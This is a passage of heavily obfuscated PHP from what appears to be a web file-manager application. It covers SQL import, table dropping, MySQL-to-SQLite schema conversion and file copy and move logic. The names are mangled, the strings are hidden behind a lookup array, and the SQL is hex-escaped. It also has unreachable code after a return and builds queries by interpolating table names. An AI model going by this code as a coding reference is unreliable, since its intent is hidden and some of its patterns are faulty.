$this->sqlDecode($éÎŞ“å, $»…ó‹²”, $öª†ï÷ç); if (stripos($³ÑË‡²–, $­«£×ä˜[433]) === 0) { if (!$£êï·û›) { $£êï·û› = $³ÑË‡²– . $­«£×ä˜[53]; } continue; } if ($ÅÃè×öà) { $ÅÃè×öà->task[$­«£×ä˜[1154]] += 1; } $È³ö£Œ++; $§«êæíñ[] = rtrim(rtrim(trim($³ÑË‡²–), $­«£×ä˜[50]), $­«£×ä˜[74]); $­Ëª˜¸ = null; $®“ƒÓş‰ = strlen($³ÑË‡²–); $õòßÛÖÜ += $®“ƒÓş‰; $Š”€šİğ = strlen($£êï·û›) + $õòßÛÖÜ + (count($§«êæíñ) - 1); if ($Š”€šİğ >= $Èû£Áâ¸) { $­Ëª˜¸ = array_pop($§«êæíñ); if ($È³ö£Œ > 1) { $È³ö£Œ--; } } if ($È³ö£Œ >= $èÂµøÏ½ || $­Ëª˜¸) { $³ÑË‡²– = $£êï·û› . implode($­«£×ä˜[50], $§«êæíñ); if (!$·€¾ÌÀç->execute($³ÑË‡²–)) { return !1; } if ($ÅÃè×öà) { $ÅÃè×öà->update($È³ö£Œ); } $§«êæíñ = array(); $È³ö£Œ = 0; $õòßÛÖÜ = 0; if ($­Ëª˜¸) { $§«êæíñ = array($­Ëª˜¸); $È³ö£Œ = 1; $õòßÛÖÜ = $®“ƒÓş‰; } } } fclose($Ã§Ê²—); if (!empty($§«êæíñ)) { $³ÑË‡²– = $£êï·û› . implode($­«£×ä˜[50], $§«êæíñ); if (!$·€¾ÌÀç->execute($³ÑË‡²–)) { return !1; } if ($ÅÃè×öà) { $ÅÃè×öà->update($È³ö£Œ); } } return !0; } public function dropTable($ÀÂ¾ÖÌ = null) { $™†¦µÕù = $this->model()->db(); $ı€èßœ… = $ÀÂ¾ÖÌ ? array($ÀÂ¾ÖÌ) : $™†¦µÕù->getTables(); if (!$ı€èßœ…) { return; } foreach ($ı€èßœ… as $ÀÂ¾ÖÌ) { if ($ÀÂ¾ÖÌ) { $ÀÂ¾ÖÌ = strtolower($ÀÂ¾ÖÌ); } else { continue; } $™†¦µÕù->execute("\144\162\157\x70\40\164\141\x62\x6c\145\x20\151\x66\40\x65\170\x69\x73\164\163\40\140{$ÀÂ¾ÖÌ}\x60"); } } private function sqlEncode($Ù‡†Îš§) { $ƒ•¶ß› =& $_SERVER[ˆö¿ÚÌ¼]; $ì¶ÅïÔÃ = array(); foreach ($Ù‡†Îš§ as $¶¯©ğˆ‡) { if (is_array($¶¯©ğˆ‡)) { $¶¯©ğˆ‡ = json_encode_force($¶¯©ğˆ‡); } $¶¯©ğˆ‡ = addslashes($¶¯©ğˆ‡); $¶¯©ğˆ‡ = str_replace(array($ƒ•¶ß›[1170], $ƒ•¶ß›[288], $ƒ•¶ß›[420]), array($ƒ•¶ß›[1171], $ƒ•¶ß›[1172], $ƒ•¶ß›[1173]), $¶¯©ğˆ‡); $ì¶ÅïÔÃ[] = $¶¯©ğˆ‡; } return $ƒ•¶ß›[58] . implode($ƒ•¶ß›[1174], $ì¶ÅïÔÃ) . $ƒ•¶ß›[58]; } private function sqlDecode($ä¸‡ı±™, $·ùÑ· , $õüÌÊ­ = '') { $áŒ£ÃŒ =& $_SERVER[ˆö¿ÚÌ¼]; $ä¸‡ı±™ = str_replace(array($áŒ£ÃŒ[1171], $áŒ£ÃŒ[1172], $áŒ£ÃŒ[1173]), array($áŒ£ÃŒ[1170], $áŒ£ÃŒ[288], $áŒ£ÃŒ[420]), $ä¸‡ı±™); if ($·ùÑ·  == $áŒ£ÃŒ[13]) { $ä¸‡ı±™ = str_ireplace($áŒ£ÃŒ[1175], $áŒ£ÃŒ[59], $ä¸‡ı±™); $ä¸‡ı±™ = stripslashes($ä¸‡ı±™); } return preg_replace($áŒ£ÃŒ[1176], $áŒ£ÃŒ[12], $ä¸‡ı±™); if ($·ùÑ·  == $áŒ£ÃŒ[13]) { return $õüÌÊ­ != $áŒ£ÃŒ[869] ? stripslashes($ä¸‡ı±™) : $ä¸‡ı±™; } if ($õüÌÊ­ == $áŒ£ÃŒ[869]) { $ä¸‡ı±™ = str_replace($áŒ£ÃŒ[1177], $áŒ£ÃŒ[121], stripslashes($ä¸‡ı±™)); } return $ä¸‡ı±™; } public function getSqlFile($ÇÒÕ·ıÄ = '') { $’å±“¡À =& $_SERVER[ˆö¿ÚÌ¼]; $ãäï§“Ş = $this->dbType(!0); $Â—§‚•Í = CONTROLLER_DIR . "\x69\156\163\x74\141\x6c\x6c\57\x64\x61\164\x61\57{$ãäï§“Ş}\x2e\163\x71\x6c"; $õÏŸœØ² = file_get_contents($Â—§‚•Í); $ùç³‹·° = $’å±“¡À[1178] . ($ãäï§“Ş == $’å±“¡À[893] ? $’å±“¡À[1179] : $’å±“¡À[1180]) . $’å±“¡À[1181]; preg_match_all($ùç³‹·°, $õÏŸœØ², $£ö«ì­); $¶ôØÂ‹¿ = $£ö«ì­[1]; $ÑÇòØ·  = $this->model()->db(); $õĞ»Ÿ¥µ = $ÑÇòØ· ->getTables(); $ã§úÂâ… = TEMP_FILES . $’å±“¡À[1182] . date($’å±“¡À[262]) . $’å±“¡À[8]; del_dir($ã§úÂâ…); mk_dir($ã§úÂâ…); $¨ú™‚¿Ş = $ã§úÂâ… . $’å±“¡À[1183]; $ÄÀÉÌ©æ = $ã§úÂâ… . $’å±“¡À[1184]; $ôÖ¾Ùäæ = $ãäï§“Ş == $’å±“¡À[13] ? $’å±“¡À[893] : $’å±“¡À[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\x74\x61\154\154\x2f\x64\x61\x74\x61\x2f{$ôÖ¾Ùäæ}\56\x73\x71\x6c", $ã§úÂâ…); @touch($ã§úÂâ… . $ãäï§“Ş . $’å±“¡À[875]); $ÛÚ¶™Ÿì = fopen($¨ú™‚¿Ş, $’å±“¡À[1158]); $ˆ™é¡ = fopen($ÄÀÉÌ©æ, $’å±“¡À[1158]); if ($ãäï§“Ş == $’å±“¡À[13]) { $õĞ»Ÿ¥µ = array_diff($õĞ»Ÿ¥µ, array($’å±“¡À[867], $’å±“¡À[868])); $ÔşË³¡ = array($’å±“¡À[1185], $’å±“¡À[1186], $’å±“¡À[1187]); fwrite($ˆ™é¡, implode(PHP_EOL, $ÔşË³¡) . PHP_EOL . PHP_EOL); foreach ($õĞ»Ÿ¥µ as $Ã½Û­î) { $ˆ›»÷¸­ = $this->sqlFromSqlite($Ã½Û­î); if (!$ˆ›»÷¸­[$’å±“¡À[13]]) { continue; } fwrite($ˆ™é¡, $ˆ›»÷¸­[$’å±“¡À[13]] . PHP_EOL . PHP_EOL); if (!in_array($Ã½Û­î, $¶ôØÂ‹¿)) { fwrite($ÛÚ¶™Ÿì, $ˆ›»÷¸­[$’å±“¡À[893]] . PHP_EOL . PHP_EOL); } } } else { foreach ($õĞ»Ÿ¥µ as $Ã½Û­î) { $ˆ›»÷¸­ = $this->sqlFromMysql($Ã½Û­î); if (!$ˆ›»÷¸­[$’å±“¡À[893]]) { continue; } fwrite($ÛÚ¶™Ÿì, $ˆ›»÷¸­[$’å±“¡À[893]] . PHP_EOL . PHP_EOL); if (!in_array($Ã½Û­î, $¶ôØÂ‹¿)) { fwrite($ˆ™é¡, $ˆ›»÷¸­[$’å±“¡À[13]] . PHP_EOL . PHP_EOL); } } } fclose($ÛÚ¶™Ÿì); fclose($ˆ™é¡); $õÏŸœØ² = array($’å±“¡À[893] => $¨ú™‚¿Ş, $’å±“¡À[13] => $ÄÀÉÌ©æ); return $ÇÒÕ·ıÄ ? $õÏŸœØ²[$ÇÒÕ·ıÄ] : $õÏŸœØ²; } public function dbType($å‰÷ÊÅ = false) { $ÆÎ¶™ =& $_SERVER[ˆö¿ÚÌ¼]; $éĞşıšà = $å‰÷ÊÅ ? $GLOBALS[$ÆÎ¶™[6]][$ÆÎ¶™[21]] : $this->database; $éĞşıšà = array_change_key_case($éĞşıšà); $œ†şˆ¹Å = $éĞşıšà[$ÆÎ¶™[1058]]; if ($œ†şˆ¹Å == $ÆÎ¶™[1055]) { $‹Ò¬Ÿ’º = explode($ÆÎ¶™[4], $éĞşıšà[$ÆÎ¶™[1064]]); $œ†şˆ¹Å = $‹Ò¬Ÿ’º[0]; } $¿òŒ‚å = array($ÆÎ¶™[1188] => $ÆÎ¶™[13], $ÆÎ¶™[1003] => $ÆÎ¶™[893]); if (isset($¿òŒ‚å[$œ†şˆ¹Å])) { $œ†şˆ¹Å = $¿òŒ‚å[$œ†şˆ¹Å]; } return $œ†şˆ¹Å; } public function sqlFromMysql($²°‹Ø¥×, $‹¼’ÌÎæ = '') { $£Ì¿ŠÃó =& $_SERVER[ˆö¿ÚÌ¼]; $ ‘ªüï = $this->model()->db(); $íÍÄ÷ù‹ = $ ‘ªüï->query($£Ì¿ŠÃó[1189] . $²°‹Ø¥× . $£Ì¿ŠÃó[464]); if (!$íÍÄ÷ù‹ || !$íÍÄ÷ù‹[0]) { return !1; } $£¼ÙÖúĞ = _get($íÍÄ÷ù‹[0], $£Ì¿ŠÃó[1190], $£Ì¿ŠÃó[12]); if (!$£¼ÙÖúĞ) { return !1; } $ı²æŠãÜ = "\x44\122\117\120\x20\124\101\x42\114\105\40\x49\x46\x20\x45\130\x49\x53\124\x53\x20\x60{$²°‹Ø¥×}\140\x3b" . PHP_EOL . $£¼ÙÖúĞ . $£Ì¿ŠÃó[74]; if ($‹¼’ÌÎæ && $‹¼’ÌÎæ == $£Ì¿ŠÃó[893]) { return $ı²æŠãÜ; } $û¶Ö …İ = array_change_key_case($GLOBALS[$£Ì¿ŠÃó[6]][$£Ì¿ŠÃó[21]]); $’ÃÚôÆÄ = $û¶Ö …İ[$£Ì¿ŠÃó[1063]]; $·óË’­æ = $£Ì¿ŠÃó[1191] . $’ÃÚôÆÄ . $£Ì¿ŠÃó[1192] . $²°‹Ø¥× . $£Ì¿ŠÃó[58]; $‡Æªæ¦Æ = $£Ì¿ŠÃó[1193] . $²°‹Ø¥× . $£Ì¿ŠÃó[991]; $ŠˆŒÍ¾® = $ ‘ªüï->query($·óË’­æ); if (empty($ŠˆŒÍ¾®)) { $ÃÄÚä¬Á = array($£Ì¿ŠÃó[893] => $£Ì¿ŠÃó[12], $£Ì¿ŠÃó[13] => $£Ì¿ŠÃó[12]); return $‹¼’ÌÎæ ? $ÃÄÚä¬Á[$‹¼’ÌÎæ] : $ÃÄÚä¬Á; } $Å¹­ü¼— = $ ‘ªüï->query($‡Æªæ¦Æ); $¦ ˜ æ› = $£Ì¿ŠÃó[12]; $Éá¸Ó’÷ = array(); foreach ($Å¹­ü¼— as $û¼‘Å„) { if (!$¦ ˜ æ› && $û¼‘Å„[$£Ì¿ŠÃó[1194]] == $£Ì¿ŠÃó[1195]) { $¦ ˜ æ› = $û¼‘Å„[$£Ì¿ŠÃó[1196]]; } if (isset($Éá¸Ó’÷[$û¼‘Å„[$£Ì¿ŠÃó[1194]]])) { $Éá¸Ó’÷[$û¼‘Å„[$£Ì¿ŠÃó[1194]]][$£Ì¿ŠÃó[1197]][] = $û¼‘Å„[$£Ì¿ŠÃó[1196]]; continue; } $Éá¸Ó’÷[$û¼‘Å„[$£Ì¿ŠÃó[1194]]] = array($£Ì¿ŠÃó[1198] => $û¼‘Å„[$£Ì¿ŠÃó[1194]], $£Ì¿ŠÃó[1197] => array($û¼‘Å„[$£Ì¿ŠÃó[1196]]), $£Ì¿ŠÃó[1199] => $û¼‘Å„[$£Ì¿ŠÃó[1200]] == $£Ì¿ŠÃó[91] ? 0 : 1); } $‹”˜•öô = array(); foreach ($Éá¸Ó’÷ as $û¼‘Å„) { $“˜É®ô = $û¼‘Å„[$£Ì¿ŠÃó[1198]] == $£Ì¿ŠÃó[1195]; $û”ƒÁ = array($£Ì¿ŠÃó[1201], $û¼‘Å„[$£Ì¿ŠÃó[1199]] == $£Ì¿ŠÃó[91] && !$“˜É®ô ? $£Ì¿ŠÃó[1202] : $£Ì¿ŠÃó[12], $£Ì¿ŠÃó[1203], $£Ì¿ŠÃó[1204] . $²°‹Ø¥× . $£Ì¿ŠÃó[11] . ($“˜É®ô ? $£Ì¿ŠÃó[1205] : $û¼‘Å„[$£Ì¿ŠÃó[1198]]) . $£Ì¿ŠÃó[121], $£Ì¿ŠÃó[1206], $£Ì¿ŠÃó[121] . $²°‹Ø¥× . $£Ì¿ŠÃó[121], $£Ì¿ŠÃó[1207] . implode($£Ì¿ŠÃó[1208], $û¼‘Å„[$£Ì¿ŠÃó[1197]]) . $£Ì¿ŠÃó[1209]); $‹”˜•öô[] = implode($£Ì¿ŠÃó[53], $û”ƒÁ) . $£Ì¿ŠÃó[74]; } $Äîåşä = array(); $Ëş¬Ñâã = array($£Ì¿ŠÃó[1210] => $£Ì¿ŠÃó[1211], $£Ì¿ŠÃó[1211] => $£Ì¿ŠÃó[1211], $£Ì¿ŠÃó[366] => $£Ì¿ŠÃó[393], $£Ì¿ŠÃó[365] => $£Ì¿ŠÃó[393]); foreach ($ŠˆŒÍ¾® as $û¼‘Å„) { $û”ƒÁ = array($£Ì¿ŠÃó[121] . $û¼‘Å„[$£Ì¿ŠÃó[1212]] . $£Ì¿ŠÃó[121], isset($Ëş¬Ñâã[$û¼‘Å„[$£Ì¿ŠÃó[1213]]]) ? $Ëş¬Ñâã[$û¼‘Å„[$£Ì¿ŠÃó[1213]]] : $û¼‘Å„[$£Ì¿ŠÃó[1214]], $û¼‘Å„[$£Ì¿ŠÃó[1215]] == $£Ì¿ŠÃó[989] ? $£Ì¿ŠÃó[1216] : $£Ì¿ŠÃó[1217], $û¼‘Å„[$£Ì¿ŠÃó[1212]] == $¦ ˜ æ› ? $£Ì¿ŠÃó[1218] : $£Ì¿ŠÃó[12], $û¼‘Å„[$£Ì¿ŠÃó[1040]] ? strtoupper(str_replace($£Ì¿ŠÃó[11], $£Ì¿ŠÃó[12], $û¼‘Å„[$£Ì¿ŠÃó[1040]])) : $£Ì¿ŠÃó[12]); $Äîåşä[] = trim(implode($£Ì¿ŠÃó[53], $û”ƒÁ)); } $ßì¡ë’Ò = array($£Ì¿ŠÃó[1219] . $²°‹Ø¥× . $£Ì¿ŠÃó[1220], $£Ì¿ŠÃó[1221] . $²°‹Ø¥× . $£Ì¿ŠÃó[1222], implode($£Ì¿ŠÃó[50] . PHP_EOL, $Äîåşä), $£Ì¿ŠÃó[1037]); $„ÀÄ’šù = implode(PHP_EOL, array_merge($ßì¡ë’Ò, $‹”˜•öô)); if ($‹¼’ÌÎæ && $‹¼’ÌÎæ == $£Ì¿ŠÃó[13]) { return $„ÀÄ’šù; } $ÃÄÚä¬Á = array($£Ì¿ŠÃó[893] => $ı²æŠãÜ, $£Ì¿ŠÃó[13] => $„ÀÄ’šù); return $‹¼’ÌÎæ ? $ÃÄÚä¬Á[$‹¼’ÌÎæ] : $ÃÄÚä¬Á; } public function sqlFromSqlite($œ¼½²šÔ, $Ó®åîÈ = '') { $ôï‚§í‘ =& $_SERVER[ˆö¿ÚÌ¼]; $©Òë§‡ø = $this->model()->db(); $ì´öÑÑ— = "\120\122\x41\x47\115\101\x20\x54\x41\102\114\105\137\111\116\106\117\x20\50\x27{$œ¼½²šÔ}\x27\51"; $µ­§“¢ = "\123\x45\x4c\x45\103\124\40\x2a\40\x46\x52\117\x4d\x20\x73\x71\154\151\164\145\137\x6d\141\163\164\145\x72\40\127\110\105\122\105\x20\164\x62\154\137\156\141\x6d\145\40\x3d\x20\x27{$œ¼½²šÔ}\x27"; $¿­Ÿ–õ‡ = $©Òë§‡ø->query($ì´öÑÑ—); if (empty($¿­Ÿ–õ‡)) { $½Ó®ßÃŸ = array($ôï‚§í‘[893] => $ôï‚§í‘[12], $ôï‚§í‘[13] => $ôï‚§í‘[12]); return $Ó®åîÈ ? $½Ó®ßÃŸ[$Ó®åîÈ] : $½Ó®ßÃŸ; } $ËÛÈ¤ôš = $©Òë§‡ø->query($µ­§“¢); $şíÖà°ä = $´«ş¸Â¿ = array(); foreach ($ËÛÈ¤ôš as $¹åáïæì) { if ($¹åáïæì[$ôï‚§í‘[33]] == $ôï‚§í‘[359]) { $şíÖà°ä[] = $¹åáïæì[$ôï‚§í‘[1223]]; } else { $´«ş¸Â¿[$¹åáïæì[$ôï‚§í‘[32]]] = $¹åáïæì[$ôï‚§í‘[1223]]; } } $Çîı‚Ü = array_merge(array($ôï‚§í‘[1219] . $œ¼½²šÔ . $ôï‚§í‘[121]), $şíÖà°ä, array_values($´«ş¸Â¿)); $Çîı‚Ü = implode($ôï‚§í‘[74] . PHP_EOL, $Çîı‚Ü) . $ôï‚§í‘[74]; if ($Ó®åîÈ && $Ó®åîÈ == $ôï‚§í‘[13]) { return $Çîı‚Ü; } $ĞÒÜ‡§ = array(); foreach ($´«ş¸Â¿ as $¾äöú ³ => $«ë§Ğ›ã) { $¦•í÷ˆ = str_replace($ôï‚§í‘[1224] . $œ¼½²šÔ . $ôï‚§í‘[11], $ôï‚§í‘[12], $¾äöú ³); $¦•í÷ˆ = str_replace($œ¼½²šÔ . $ôï‚§í‘[11], $ôï‚§í‘[12], $¾äöú ³); $«é‹…·ğ = str_replace(array($ôï‚§í‘[121], $ôï‚§í‘[1048]), $ôï‚§í‘[464], substr($«ë§Ğ›ã, stripos($«ë§Ğ›ã, $ôï‚§í‘[340]))); $ĞÒÜ‡§[$¦•í÷ˆ] = $«é‹…·ğ; } $ÓÓåÅ¸¯ = array(); $„¼¡ªÁì = array($ôï‚§í‘[1211] => $ôï‚§í‘[1225], $ôï‚§í‘[393] => $ôï‚§í‘[1226]); $—Ößı·å = $„ÙÀ‰èœ = $ôï‚§í‘[12]; foreach ($¿­Ÿ–õ‡ as $¹åáïæì) { if ($¹åáïæì[$ôï‚§í‘[57]] == $ôï‚§í‘[91]) { $—Ößı·å = $¹åáïæì[$ôï‚§í‘[32]]; } $ôÎˆ»— = $¹åáïæì[$ôï‚§í‘[33]]; if ($ôÎˆ»— == $ôï‚§í‘[1227] && isset($ĞÒÜ‡§[$¹åáïæì[$ôï‚§í‘[32]]])) { $ôÎˆ»— = $ôï‚§í‘[1228]; } $–Ï¯³´Ù = array($ôï‚§í‘[464] . $¹åáïæì[$ôï‚§í‘[32]] . $ôï‚§í‘[464], _get($„¼¡ªÁì, $ôÎˆ»—, $ôÎˆ»—), $¹åáïæì[$ôï‚§í‘[35]] == $ôï‚§í‘[91] ? $ôï‚§í‘[1216] : $ôï‚§í‘[1229] . $¹åáïæì[$ôï‚§í‘[56]], $¹åáïæì[$ôï‚§í‘[57]] == $ôï‚§í‘[91] ? $ôï‚§í‘[1230] : $ôï‚§í‘[12]); $ÓÓåÅ¸¯[] = trim(implode($ôï‚§í‘[53], $–Ï¯³´Ù)); } foreach ($ĞÒÜ‡§ as $¦•í÷ˆ => $«é‹…·ğ) { if ($¦•í÷ˆ == $ôï‚§í‘[1205]) { $Ñ¹ÔƒàÔ = $„ÙÀ‰èœ = $ôï‚§í‘[1231] . $—Ößı·å . $ôï‚§í‘[1232]; } else { $Ñ¹ÔƒàÔ = (stripos($¦•í÷ˆ, $ôï‚§í‘[11]) ? $ôï‚§í‘[1233] : $ôï‚§í‘[12]) . ($ôï‚§í‘[1234] . $¦•í÷ˆ . $ôï‚§í‘[1235] . $«é‹…·ğ); } $ÓÓåÅ¸¯[] = $Ñ¹ÔƒàÔ; } if ($—Ößı·å && !$„ÙÀ‰èœ) { $ÓÓåÅ¸¯ = array_merge(array($ôï‚§í‘[1231] . $—Ößı·å . $ôï‚§í‘[1232]), $ÓÓåÅ¸¯); } $ÙÎ¼§ = array($ôï‚§í‘[1236] . $œ¼½²šÔ . $ôï‚§í‘[1237], $ôï‚§í‘[1238] . $œ¼½²šÔ . $ôï‚§í‘[1239], implode($ôï‚§í‘[50] . PHP_EOL, $ÓÓåÅ¸¯), $ôï‚§í‘[1240]); $Ã‘¾Úæà = implode(PHP_EOL, $ÙÎ¼§); if ($Ó®åîÈ && $Ó®åîÈ == $ôï‚§í‘[893]) { return $Ã‘¾Úæà; } $½Ó®ßÃŸ = array($ôï‚§í‘[893] => $Ã‘¾Úæà, $ôï‚§í‘[13] => $Çîı‚Ü); return $Ó®åîÈ ? $½Ó®ßÃŸ[$Ó®åîÈ] : $½Ó®ßÃŸ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ˆ”Óˆãà, $¢Ò¿œÚó) { $Ş§ÚÜ¦â =& $_SERVER[ˆö¿ÚÌ¼]; $¾ÌÂÆÓ‡ = $¢Ò¿œÚó; $GLOBALS[$Ş§ÚÜ¦â[1241]] = $Ş§ÚÜ¦â[1242] . $ˆ”Óˆãà; Hook::trigger($Ş§ÚÜ¦â[1242] . $ˆ”Óˆãà . $Ş§ÚÜ¦â[1243], $¾ÌÂÆÓ‡); $ğó°¿ºŸ = self::driverMake($¢Ò¿œÚó[0]); if (!$ğó°¿ºŸ) { return !1; } if (method_exists($ğó°¿ºŸ, $ˆ”Óˆãà)) { $£›÷¦œ˜ = @call_user_func_array(array($ğó°¿ºŸ, $ˆ”Óˆãà), $¢Ò¿œÚó); } else { if (method_exists($ğó°¿ºŸ, $Ş§ÚÜ¦â[1244])) { $£›÷¦œ˜ = @call_user_func_array(array($ğó°¿ºŸ, $ˆ”Óˆãà), $¢Ò¿œÚó); } else { if (method_exists(self, $ˆ”Óˆãà)) { $£›÷¦œ˜ = @call_user_func_array(array(self, $ˆ”Óˆãà), $¢Ò¿œÚó); } else { $£›÷¦œ˜ = call_user_func_array(array(parent, $ˆ”Óˆãà), $¢Ò¿œÚó); } } } Hook::trigger($Ş§ÚÜ¦â[1242] . $ˆ”Óˆãà . $Ş§ÚÜ¦â[1245], $¾ÌÂÆÓ‡, $£›÷¦œ˜); return $£›÷¦œ˜; } public static function init($„Òî‘Ëœ) { return self::driverMake($„Òî‘Ëœ); } public static function copy($É™¡¹—, $Ù¥Ğ«Àˆ, $àÈŒİ¡Ğ = false, $¨ñÜ¸–Ä = false) { return self::copyMoveStart($É™¡¹—, $Ù¥Ğ«Àˆ, $àÈŒİ¡Ğ, $_SERVER[ˆö¿ÚÌ¼][635], $¨ñÜ¸–Ä); } public static function move($Ê äğ€œ, $ıé»ç¸“, $Æ³Ó¾ = false, $ïƒ“ÓÖµ = false) { return self::copyMoveStart($Ê äğ€œ, $ıé»ç¸“, $Æ³Ó¾, $_SERVER[ˆö¿ÚÌ¼][637], $ïƒ“ÓÖµ); } public static function copyMoveChildren($î¢·¾ù, $›ùÄÔ“Ğ, $²‹Œùû¤ = "\143\x6f\160\171", $ôéÈ“´ó = REPEAT_REPLACE) { $Ú÷Ş¥‚ =& $_SERVER[ˆö¿ÚÌ¼]; $ç¹†Ã¨Ò = $î¢·¾ù; $÷ïéäŒ = self::driverMake($î¢·¾ù); $¾å²Õ…ç = $÷ïéäŒ->listPath($î¢·¾ù, !0); $úÆÄªÒö = array_merge($¾å²Õ…ç[$Ú÷Ş¥‚[86]], $¾å²Õ…ç[$Ú÷Ş¥‚[85]]); foreach ($úÆÄªÒö as $®Ôë”Ë¢) { self::copyMoveStart($®Ôë”Ë¢[$Ú÷Ş¥‚[87]], $›ùÄÔ“Ğ, $ôéÈ“´ó, $²‹Œùû¤, !1); } if ($²‹Œùû¤ == $Ú÷Ş¥‚[637]) { self::remove($ç¹†Ã¨Ò); } } private static function copyMoveStart($Î§ÚˆÊ¼, $ù‡¡öêÀ, $‹âÀÆí¤, $àÓÒ’°, $”Ğ³§Ê) { $ó¸À¬ÛŠ =& $_SERVER[ˆö¿ÚÌ¼]; $¿°Ÿ·ºÕ = array($Î§ÚˆÊ¼, $ù‡¡öêÀ, $‹âÀÆí¤, $”Ğ³§Ê); Hook::trigger($ó¸À¬ÛŠ[1242] . $àÓÒ’° . $ó¸À¬ÛŠ[1243], $¿°Ÿ·ºÕ); $¶¿ãàÑ„ = self::copyMove($Î§ÚˆÊ¼, $ù‡¡öêÀ, $‹âÀÆí¤, $àÓÒ’°, $”Ğ³§Ê); Hook::trigger($ó¸À¬ÛŠ[1242] . $àÓÒ’° . $ó¸À¬ÛŠ[1245], $¿°Ÿ·ºÕ, $¶¿ãàÑ„); return $¶¿ãàÑ„; } public static function saveFile($Ç‡·»ä, $¦ÜÖÔŞ½, $ûıõ¾‘Ê = true) { $ï‡ç©¼ =& $_SERVER[ˆö¿ÚÌ¼]; $Ù³ñÒŸ = self::info($¦ÜÖÔŞ½); $µâêº¯À = self::driverMake($Ç‡·»ä); $ÂœÅ¾å± = self::driverMake($¦ÜÖÔŞ½); $¯áñÒìù = !1; if ($ÂœÅ¾å±->pathParse[$ï‡ç©¼[1246]]) { $¯áñÒìù = $ÂœÅ¾å±; $øŠ®ô¿á = $ÂœÅ¾å±->pathParse[$ï‡ç©¼[1246]]; $ÂœÅ¾å± = self::driverMake($øŠ®ô¿á); } if ($µâêº¯À->pathParse[$ï‡ç©¼[1246]]) { $ûñ®‹È“ = $µâêº¯À->pathParse[$ï‡ç©¼[1246]]; $µâêº¯À = self::driverMake($ûñ®‹È“); } $æöÖ­·¾ = $ÂœÅ¾å±->pathFather($¦ÜÖÔŞ½); $æŠÖáëù = !0; if (!$ûıõ¾‘Ê && self::driverIsSame($µâêº¯À, $ÂœÅ¾å±)) { $æŠÖáëù = !1; } $áÅÅı–ú = self::copyFile($µâêº¯À, $Ç‡·»ä, $ÂœÅ¾å±, $æöÖ­·¾, $Ù³ñÒŸ[$ï‡ç©¼[32]], $æŠÖáëù); if ($¯áñÒìù) { $áÅÅı–ú = $¯áñÒìù->getPathOuter($áÅÅı–ú); } return $áÅÅı–ú; } private static function copyMove($ä°¦–€Æ, $Óåª¢Ò½, $…Şµó„¾, $°ŸÇƒ…Ó, $óôÎÏ’Æ = false) { $Ÿ¼Å»Ç =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ä°¦–€Æ || $ä°¦–€Æ == $Ÿ¼Å»Ç[8] || !$Óåª¢Ò½) { return !1; } ignore_timeout(); $Ãß›¥¼í = self::driverMake($ä°¦–€Æ); $àë„Œ±¤ = self::driverMake($Óåª¢Ò½); $ğ£­ßø = $°ŸÇƒ…Ó == $Ÿ¼Å»Ç[637]; $Ø„É÷ÇÍ = !1; if ($àë„Œ±¤->pathParse[$Ÿ¼Å»Ç[1246]]) { $Ø„É÷ÇÍ = $àë„Œ±¤; $Óåª¢Ò½ = $àë„Œ±¤->pathParse[$Ÿ¼Å»Ç[1246]]; $àë„Œ±¤ = self::driverMake($Óåª¢Ò½); } if ($Ãß›¥¼í->pathParse[$Ÿ¼Å»Ç[1246]]) { $ä°¦–€Æ = $Ãß›¥¼í->pathParse[$Ÿ¼Å»Ç[1246]]; $Ãß›¥¼í = self::driverMake($ä°¦–€Æ); } self::check($Ãß›¥¼í, $ä°¦–€Æ, $àë„Œ±¤, $Óåª¢Ò½); Hook::trigger($Ÿ¼Å»Ç[1247], $Ãß›¥¼í, $ä°¦–€Æ, $àë„Œ±¤, $Óåª¢Ò½); $—Øş—ª = self::driverIsSame($Ãß›¥¼í, $àë„Œ±¤); if ($—Øş—ª) { if ($°ŸÇƒ…Ó == $Ÿ¼Å»Ç[637] && !method_exists($àë„Œ±¤, $Ÿ¼Å»Ç[1248]) && trim($Óåª¢Ò½, $Ÿ¼Å»Ç[8]) == trim($àë„Œ±¤->pathFather($ä°¦–€Æ), $Ÿ¼Å»Ç[8])) { if ($Ãß›¥¼í->pathThis($ä°¦–€Æ) != $óôÎÏ’Æ && !$Ãß›¥¼í->isOsDriver()) { return $Ãß›¥¼í->rename($ä°¦–€Æ, $óôÎÏ’Æ); } return $àë„Œ±¤->getPathOuter($ä°¦–€Æ); } if (method_exists($àë„Œ±¤, $°ŸÇƒ…Ó)) { return $àë„Œ±¤->{$°ŸÇƒ…Ó}($ä°¦–€Æ, $Óåª¢Ò½, $…Şµó„¾, $óôÎÏ’Æ); } } if ($—Øş—ª && $°ŸÇƒ…Ó == $Ÿ¼Å»Ç[637] && $àë„Œ±¤->getType() == $Ÿ¼Å»Ç[109]) { $»Îƒ¹Í = $àë„Œ±¤->movePath($ä°¦–€Æ, $Óåª¢Ò½, $óôÎÏ’Æ); if ($»Îƒ¹Í) { return $»Îƒ¹Í; } } $º¯Ò¬§í = $Ãß›¥¼í->isFile($ä°¦–€Æ); if (!$º¯Ò¬§í && $àë„Œ±¤->getType() == $Ÿ¼Å»Ç[842] && $Ãß›¥¼í->getType() == $Ÿ¼Å»Ç[109]) { $»Îƒ¹Í = $àë„Œ±¤->copyFolderFromIO($Ãß›¥¼í, $ä°¦–€Æ, $Óåª¢Ò½, $…Şµó„¾, $ğ£­ßø, $óôÎÏ’Æ); } else { $»Îƒ¹Í = self::copyPath($Ãß›¥¼í, $ä°¦–€Æ, $àë„Œ±¤, $Óåª¢Ò½, $…Şµó„¾, $ğ£­ßø, $º¯Ò¬§í, $óôÎÏ’Æ); } if ($»Îƒ¹Í && $ğ£­ßø) { $Ãß›¥¼í->remove($ä°¦–€Æ); } if ($Ø„É÷ÇÍ) { $»Îƒ¹Í = $Ø„É÷ÇÍ->getPathOuter($»Îƒ¹Í); } return $»Îƒ¹Í; } private static function check($§³èİŠç, $çı‡Öë, $Ç ™°ù, &$¤àı”Ë) { $çù…¯ê¯ =& $_SERVER[ˆö¿ÚÌ¼]; if (self::driverIsSame($§³èİŠç, $Ç ™°ù) && $§³èİŠç->isFolder($çı‡Öë) && $§³èİŠç->isParentOf($çı‡Öë, $¤àı”Ë)) { show_json(LNG($çù…¯ê¯[1249]), !1); } if (!$§³èİŠç->exist($çı‡Öë)) { show_json(LNG($çù…¯ê¯[108]), !1); } } private static function copyPath($¥ÔØ€ûª, $î¡µá‘à, 